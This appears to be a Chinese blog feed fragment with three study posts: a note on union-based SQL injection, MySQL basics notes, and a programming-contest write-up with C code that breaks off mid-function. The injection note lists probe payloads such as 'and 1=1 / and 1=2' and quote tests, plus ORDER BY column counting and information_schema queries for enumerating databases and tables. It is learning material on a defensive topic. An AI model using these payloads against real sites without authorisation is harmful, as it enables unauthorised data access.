        <content type="html"><![CDATA[<h1 id="联合查询注入-来自：sechub"><a href="#联合查询注入-来自：sechub" class="headerlink" title="联合查询注入 来自：sechub"></a>联合查询注入 来自：sechub</h1><h2 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h2><p>我们可能存在SQL注入变量的后边添加以下payload：</p><ul><li>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整型判断）</li><li>单引号判断’显示数据库错误信息或者页面回显不同（整型，字符串类型判断）</li><li>\ (转义符)</li><li>-1 &#x2F; +1 回显下一个或上一个页面 （整型判断）</li></ul><p>注：加号’+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p><h2 id="2-判断是整型注入还是字符型注入"><a href="#2-判断是整型注入还是字符型注入" class="headerlink" title="2.判断是整型注入还是字符型注入"></a>2.判断是整型注入还是字符型注入</h2><p>数字型与字符型的最大区别在于：<br>    数字类型不需要引号闭合，而字符类型需要使用引号闭合。</p><p>数字型：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>字符型:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="3-根据不同的分类进行注入"><a href="#3-根据不同的分类进行注入" class="headerlink" title="3.根据不同的分类进行注入"></a>3.根据不同的分类进行注入</h2><p>根据SQL注入语法分类：</p><ul><li>UNION query SQL injection(可联合查询注入)</li><li>Error-based SQL injection(报错型注入)</li><li>Boolean-based blind SQL injection(基于布尔型注入)</li><li>Time-based blind SQL injection(基于时间延迟注入)</li><li>Stacked queries SQL injection(可多语句查询注入)</li></ul><h3 id="3-1-MySQL中UNION使用规则"><a href="#3-1-MySQL中UNION使用规则" class="headerlink" title="3.1 MySQL中UNION使用规则"></a>3.1 MySQL中UNION使用规则</h3><p>UNION的作用时间俩个或多个select语句查询结果合并起来</p><ul><li>UNION必须由俩条或俩条以上的select语句组成，语句之间用UNION分隔</li><li>UNION中的每个查询的列数必须相同</li><li>UNION会从查询结果集中自动去除重复行</li></ul><h3 id="3-2-判断查询列数"><a href="#3-2-判断查询列数" class="headerlink" title="3.2 判断查询列数"></a>3.2 判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照制定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段位1，第二个位2，以此类推，我们可以通过二分猜解列数。<br>例：</p><p>order by 1</p><p>order by 20</p><p>order by 10</p><h3 id="3-3-获取所有数据库名"><a href="#3-3-获取所有数据库名" class="headerlink" title="3.3 获取所有数据库名"></a>3.3 获取所有数据库名</h3><p>group_concat()一次性显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>limit逐一显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(SCHEMA_NAME) <span class="keyword">FROM</span> information_schema.schemata #查询数据库个数</span><br><span class="line"><span class="keyword">select</span> SCHEMA_NAME <span class="keyword">from</span> information_schema.SCHEMATA limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="3-4-获取数据库-test-所有表名"><a href="#3-4-获取数据库-test-所有表名" class="headerlink" title="3.4 获取数据库(test)所有表名"></a>3.4 获取数据库(test)所有表名</h3><p>group_concat()一次性显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p>limi 逐一显示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.SCHEMATA <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="4-联合查询"><a href="#4-联合查询" class="headerlink" title="4.联合查询"></a>4.联合查询</h2><p>前提条件：页面上有显示位</p><p>什么是显示位？</p><p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫<em>显示位</em></p><h2 id="5-过程"><a href="#5-过程" class="headerlink" title="5.过程"></a>5.过程</h2><p><img src="https://s2.loli.net/2023/03/18/3TneEwuYtpIokxd.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习笔记</title>
      <link href="/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p123456 <span class="comment">--登陆时密码-p后不能有空格</span></span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> Host <span class="operator">=</span> <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">--修改用户密码</span></span><br><span class="line">flush privileges; <span class="comment">-- 刷新权限</span></span><br><span class="line">所有语句结尾都是用;结尾</span><br><span class="line"><span class="keyword">show</span> databases; <span class="comment">-- 查看所有数据库</span></span><br><span class="line">mysql<span class="operator">&gt;</span> use home <span class="comment">-- 切换数据库 use 数据库名</span></span><br><span class="line"><span class="keyword">show</span> tables; <span class="comment">-- 查看数据库中所有的表</span></span><br><span class="line"><span class="keyword">describe</span> student; <span class="comment">-- 显示数据库中所有信息</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/PlXSLUocQie21Wz.png" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database westos; <span class="comment">-- 创建一个数据库</span></span><br><span class="line"></span><br><span class="line">exit; <span class="comment">-- 退出连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 单行注释(SQL的本来的注释)</span></span><br><span class="line"><span class="comment">/*SQL多行注释</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据库xxx语言 CRUD增删改查</p><p>DDL 定义</p><p>DML 操作</p><p>DQL 查询</p><p>DCL 控制</p><h1 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h1><p>操作数据库-&gt;操作数据库中的表-&gt;操作数据库中表的数据</p><p>mysql 关键字不区分大小写 </p><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1. 创建数据库"></a>1. 创建数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> westos;</span><br></pre></td></tr></table></figure><h2 id="2-删除数据库"><a href="#2-删除数据库" class="headerlink" title="2. 删除数据库"></a>2. 删除数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> westos;</span><br></pre></td></tr></table></figure><h2 id="3-使用数据库"><a href="#3-使用数据库" class="headerlink" title="3. 使用数据库"></a>3. 使用数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- tab键上面，如果你的表名或者字段名时一个特殊字符，就需要带 ( ` )</span></span><br><span class="line">USE home;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/Ew4zWRp1nCgAbIv.png" alt="image.png"></p><h2 id="4-查看数据库"><a href="#4-查看数据库" class="headerlink" title="4. 查看数据库"></a>4. 查看数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; <span class="comment">--查看所有数据可</span></span><br></pre></td></tr></table></figure><p>学习思路<br>    - 对照SQLyog可视化，然后在历史记录里查看<br>    - 固定的语法或关键字必须强行记住</p><h1 id="数据库的数据类型"><a href="#数据库的数据类型" class="headerlink" title="数据库的数据类型"></a>数据库的数据类型</h1><h2 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h2><ul><li>tinyint 十分小的数据 1个字节</li><li>smallint 较小的数据  2个字节</li><li><strong>int 标准的整数  4个字节</strong></li><li>bigint 较大的数据 8个字节</li><li>float 浮点数 4个字节 </li><li>double 浮点数 8个字节 （精度问题）</li><li>decimal 字符串形式的浮点数 金融计算一般使用decimal</li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li>char 字符串 固定大小 0-255</li><li><strong>varchar 可变长字符串 0-65535</strong> 常用的变量 String</li><li>tinytext 微型文本 2^8 - 1 </li><li>text 文本串 2^16 - 1 保存大文本</li><li></li></ul><h2 id="时间日期"><a href="#时间日期" class="headerlink" title="时间日期"></a>时间日期</h2><ul><li>date YYYY-MM-DD，日期格式</li><li>time HH:mm:ss 时间格式 </li><li><strong>datetime 最常用的时间格式</strong></li><li><strong>timestamp 时间戳,1970.1.1 到现在的毫秒数！</strong></li><li>year 年份</li></ul><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><ul><li>没有值或未知<br><strong>注意， 不要使用null进行运算，结果位NULL</strong></li></ul><h1 id="数据库的字段属性"><a href="#数据库的字段属性" class="headerlink" title="数据库的字段属性"></a>数据库的字段属性</h1><p><em>Unsigned</em>:</p><ul><li>无符号的整数</li><li>声明了该列不能声明为负数</li></ul><p><em>zerofill</em>:</p><ul><li>0填充的</li><li>不足的位数，使用0来填充，int(3), 5—005</li></ul><p> <em>自增</em></p><ul><li>通常理解为，自动在上一条记录的基础上+1（默认）</li><li>通常用来设计唯一的主键-index，必须是整数类型</li><li>可以自定义设计主键自增的起始值和步长</li></ul><p> <em>非空 Null not null</em></p><ul><li>假设设施为not null，如果不给它赋值，就会报错！</li><li>NULL,如果不填值，默认为NULL</li></ul><p> <em>默认</em> </p><ul><li>设置默认值</li><li>sex，比如默认值为男，如果不指定该列的值，则默认为男</li></ul><h3 id="student-1"><a href="#student-1" class="headerlink" title="student 1"></a>student 1</h3> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 目标：创建一个scahool数据库</span></span><br><span class="line"><span class="comment">-- 创建学生表（列，字段） 使用SQL创建</span></span><br><span class="line"><span class="comment">-- 学号int 登陆密码varchar（20） 姓名，性别varcahr（2），出生日期（datatime），家庭住址，email</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注意点，使用英文（），表的名称和字段尽量用``括起来</span></span><br><span class="line"><span class="comment">-- AUTO_INCREMENT 自增</span></span><br><span class="line"><span class="comment">-- 字符串使用单引号括起来！</span></span><br><span class="line"><span class="comment">-- 所有的语句后面加,(英文的)，最后一个不用加</span></span><br><span class="line"><span class="comment">-- primary key ,主键一般一个表只有一个唯一的主键</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `student3` (</span><br><span class="line">`id` <span class="type">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">`name` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;匿名&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">`password` <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">`sex` <span class="type">VARCHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;无&#x27;</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">`birthday` DATETIME <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出生日期&#x27;</span>,</span><br><span class="line">`address` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;家庭住址&#x27;</span>,</span><br><span class="line">`email` <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>INNODB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"><span class="comment">-- 这个冒号在SQLyog可加可不加</span></span><br></pre></td></tr></table></figure><p> <strong>格式</strong><br> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] `表名`(</span><br><span class="line">    <span class="string">&#x27;字段名1&#x27;</span> 列类型 [属性][索引][注释],</span><br><span class="line">    <span class="string">&#x27;字段名2&#x27;</span> 列类型 [属性][索引][注释],</span><br><span class="line">    #...</span><br><span class="line">    <span class="string">&#x27;字段名n&#x27;</span> 列类型 [属性][索引][注释]</span><br><span class="line">)[表类型][表字符集][注释];</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE school <span class="comment">-- 查看创建数据库的语句</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student <span class="comment">-- 查看student数据表的定义语句</span></span><br><span class="line"><span class="keyword">DESC</span> student <span class="comment">-- 显示表的结构</span></span><br></pre></td></tr></table></figure><h2 id="数据表的类型"><a href="#数据表的类型" class="headerlink" title="数据表的类型"></a>数据表的类型</h2> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 关于数据库引擎</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">INNODB 默认使用~</span></span><br><span class="line"><span class="comment">MYISAM 早些年使用的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>MYISAM</th><th>INNODB</th></tr></thead><tbody><tr><td>事务支持</td><td>不支持</td><td>支持</td></tr><tr><td>数据行锁定</td><td>不支持</td><td>支持</td></tr><tr><td>外键约束</td><td>不支持</td><td>支持</td></tr><tr><td>全文索引</td><td>支持</td><td>不支持</td></tr><tr><td>表空间大小</td><td>较小</td><td>较大，约为2倍</td></tr><tr><td>常规使用操作：</td><td></td><td></td></tr></tbody></table><ul><li>MYISAM 节约空间，速度较快</li><li>INNODB 安全性高，多表多用户操作</li></ul><p> 在物理空间的位置:<br> 所有的数据库文件都在data目录下<br> 本质还是文件的存储</p><p> MySQL引擎在物理文件上的去呗</p><ul><li>InnoDB 在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1文件</li><li>MYISAM<ol><li>*.frm 表结构的定义文件</li><li>*.MYD 数据文件（data) </li><li>*myi 索引文件(index)<br>  设置数据库表的字符集编码<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure><em>不设置的话，会时MySQL默认的字符集（不支持中文）</em><br>MySQL的默认便把时Latin1<br>可在my.ini修改</li></ol></li></ul><h2 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher rename <span class="keyword">as</span> teacher1； <span class="comment">-- 修改表名</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 <span class="keyword">add</span> age <span class="type">int</span>(<span class="number">11</span>)； <span class="comment">-- 增加字段</span></span><br></pre></td></tr></table></figure><h3 id="修改表的字段-重命名，修改约束！"><a href="#修改表的字段-重命名，修改约束！" class="headerlink" title="修改表的字段(重命名，修改约束！)"></a>修改表的字段(重命名，修改约束！)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 modify age <span class="type">varchar</span>(<span class="number">11</span>); <span class="comment">-- 修改约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 change age age1 <span class="type">int</span>(<span class="number">1</span>); <span class="comment">-- 字段重命名</span></span><br><span class="line"><span class="comment">-- change 用来字段重命名，不能修改字段类型和约束</span></span><br><span class="line"><span class="comment">-- modify 不用来字段重命名，之恶能修改类型和约束</span></span><br></pre></td></tr></table></figure><h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 <span class="keyword">drop</span> age; <span class="comment">-- 删除表的字段</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> teacher1p; <span class="comment">-- 删除整个表</span></span><br></pre></td></tr></table></figure><p><em>所有的创建和和三处操作尽量加上判断，以免报错</em></p><p>注意点:</p><ul><li>&#96;&#96;字段名用这个包裹</li><li>注释– &#x2F;**&#x2F;</li><li>sql关键字大小写不敏感，建议小写</li><li>所有的符号用英文</li></ul><h1 id="Mysql的数据管理"><a href="#Mysql的数据管理" class="headerlink" title="Mysql的数据管理"></a>Mysql的数据管理</h1><h2 id="3-1-外键-了解即可"><a href="#3-1-外键-了解即可" class="headerlink" title="3.1. 外键(了解即可"></a>3.1. 外键(了解即可</h2><p>方式一:在创建表的时候，增加约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 学生表的gradeid字段，要去引用年级表的gradeid</span></span><br><span class="line"><span class="comment">-- 定义外键key</span></span><br><span class="line"><span class="comment">-- 给这个外键添加约束 (执行引用) references 引用</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `student` (</span><br><span class="line">    `id` <span class="type">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">    `name` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;匿名&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    `password` <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    `sex` <span class="type">VARCHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;无&#x27;</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">    `birthday` DATETIME <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出生日期&#x27;</span>,</span><br><span class="line">    `address` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;家庭住址&#x27;</span>,</span><br><span class="line">    `email` <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(`id`)</span><br><span class="line">    KEY `FK_gradeid` (`gradeid`)</span><br><span class="line">    <span class="keyword">constraint</span> `FK_gradeid` <span class="keyword">foreign</span> key(`gradeid`) <span class="keyword">references</span> `grade` (`gradeid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>INNODB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure><p>方式二: 创建表成功后，没有外键关系</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表的时候没有外键关系</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> `student`</span><br><span class="line"><span class="keyword">add</span> constaint `FK_gradeid` <span class="keyword">foreign</span> key(`gradeid`) <span class="keyword">references</span> `grade` (`gradeid`);</span><br></pre></td></tr></table></figure><p>删除有外键关系的表的时候，必须要先删除引用别人的表（从表），再删除主表</p><p>以上的操作都是物理外键，数据库级别的外键，我们不建议使用！（避免数据库过多困扰）</p><p><em>最佳实践</em></p><ul><li>数据库就是单纯的表，只用来存数据，只有行（数据）和列（字段）</li><li>我们想使用多张表的数据，想使用外键（程序去使用）</li><li></li></ul><h2 id="3-2-DML语言-全部记住"><a href="#3-2-DML语言-全部记住" class="headerlink" title="3.2. DML语言(全部记住)"></a>3.2. DML语言(全部记住)</h2><p>数据库意义:数据存储、数据管理<br>DML语言：数据操作语言</p><ul><li>insert</li><li>update</li><li>delet</li></ul><h3 id="3-2-1-添加insert"><a href="#3-2-1-添加insert" class="headerlink" title="3.2.1 添加insert"></a>3.2.1 添加insert</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 插入语句（添加）</span></span><br><span class="line"><span class="comment">-- insert into 表名([字段名1，字段2，字段3])values(&#x27;值1&#x27;),(&#x27;值2&#x27;)....</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(`gradename`) <span class="keyword">values</span>(`大四`);</span><br><span class="line"><span class="comment">--由于主键自增，我们可以省略(如果不写表的字段就会一一匹配)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade` <span class="keyword">values</span>(<span class="string">&#x27;大三&#x27;</span>);</span><br><span class="line"><span class="comment">-- 一般写插入语句，我们一定要数据和字段一一对应！</span></span><br><span class="line"><span class="comment">-- 插入多个字段</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(`gradename`) <span class="keyword">values</span>(<span class="string">&#x27;大二&#x27;</span>),(<span class="string">&#x27;大一&#x27;</span>,)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student`(`name`) <span class="keyword">values</span> (<span class="string">&#x27;张三&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student`(`name`,`pwd`,`sex`) <span class="keyword">values</span>(<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;aaaaa&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student` <span class="keyword">values</span> (<span class="number">5</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;2001-02-01&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;西安&#x27;</span>,<span class="string">&#x27;Email&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>字段和字段之间使用英文逗号隔开</li><li>字段是可以省略的，但是后面的值必须一一对应</li><li>可以同时插入多条数据，values后面的值，需要使用逗号隔开</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛客小白赛68失败经验</title>
      <link href="/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="参赛经历"><a href="#参赛经历" class="headerlink" title="参赛经历"></a>参赛经历</h1><p>本来是去初学者试炼营，偶然点进小白赛，发现参赛的方式不是很复杂，蛮试一下</p><h1 id="A题"><a href="#A题" class="headerlink" title="A题"></a>A题</h1><h2 id="Tokitsukaze-and-New-Operation"><a href="#Tokitsukaze-and-New-Operation" class="headerlink" title="Tokitsukaze and New Operation"></a>Tokitsukaze and New Operation</h2><p><img src="https://s2.loli.net/2023/03/12/GaZ1gIvte2FpdSi.png" alt="1.png"><br><img src="https://s2.loli.net/2023/03/12/n7ZzfrcdYVL4lyU.png" alt="2.png"></p><p>我的思路是用模10，除10的方法遍历每位数，再去做，途中也遇到很多问题，相乘小于10，要乘的10的不同次方，在解决种种问题后，自测运行过了</p><h3 id="判断位数是否一致"><a href="#判断位数是否一致" class="headerlink" title="判断位数是否一致"></a>判断位数是否一致</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">istrue</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> countx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> county = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">x = x / <span class="number">10</span>;</span><br><span class="line">countx++;</span><br><span class="line">&#125;<span class="keyword">while</span> (x != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">y = y / <span class="number">10</span>;</span><br><span class="line">county++;</span><br><span class="line">&#125;<span class="keyword">while</span> (y != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (countx == county)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算各位数相乘"><a href="#计算各位数相乘" class="headerlink" title="计算各位数相乘"></a>计算各位数相乘</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cacux</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> num = x;<span class="comment">//注意x的值不能变，引入变量 </span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">num = num / <span class="number">10</span>;</span><br><span class="line">count++;</span><br><span class="line">&#125;<span class="keyword">while</span> (num != <span class="number">0</span>);</span><br><span class="line"><span class="comment">//printf(&quot;%d\n&quot;, count);</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">&#123;</span><br><span class="line">ret += (x % <span class="number">10</span>) * (y % <span class="number">10</span>) * <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line"><span class="keyword">if</span> ((x % <span class="number">10</span>) * (y % <span class="number">10</span>) &lt; <span class="number">10</span>)</span><br><span class="line">j = j + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">j = j + <span class="number">2</span>;</span><br><span class="line">x = (x - (x % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line">y = (y - (y % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line"><span class="comment">//printf(&quot;%d %d %d\n&quot;, ret, x, y);</span></span><br><span class="line"><span class="comment">//为0的话就不能往上，&lt;10 </span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  